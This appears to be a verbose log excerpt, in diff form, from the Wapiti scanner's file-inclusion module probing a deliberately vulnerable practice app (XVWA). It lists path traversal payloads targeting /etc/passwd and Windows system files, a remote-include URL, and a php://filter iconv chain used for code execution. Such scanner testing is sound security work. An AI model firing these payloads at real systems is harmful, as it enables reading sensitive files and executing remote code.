+2024-03-20 15:24:16.401 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.414 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.484 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.499 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.527 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.542 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.558 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.573 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.588 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.602 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.617 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.631 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=file%3A%2F%2F%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.645 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&search=
+2024-03-20 15:24:16.659 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.675 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.691 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.707 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.723 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 15:24:16.776 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 15:24:16.791 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2Fetc%2Fpasswd
+2024-03-20 15:24:16.806 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2Fetc%2Fpasswd%00
+2024-03-20 15:24:16.821 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2Fetc%2Fservices
+2024-03-20 15:24:16.835 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2Fetc%2Fservices%00
+2024-03-20 15:24:16.847 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:16.858 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 15:24:16.871 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 15:24:16.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:16.897 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:16.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 15:24:16.922 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 15:24:16.936 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 15:24:16.948 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:16.961 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:16.973 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:16.987 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:17.000 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:17.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:17.025 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:17.037 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:17.049 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:17.061 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:17.074 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:17.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:17.101 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 15:24:17.113 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:17.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:17.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:17.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:17.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:17.182 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:17.198 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:17.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:17.226 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:17.240 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:17.256 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:17.271 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:17.288 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:17.304 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:17.320 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:17.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:17.353 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:17.370 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:17.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:17.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:17.421 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
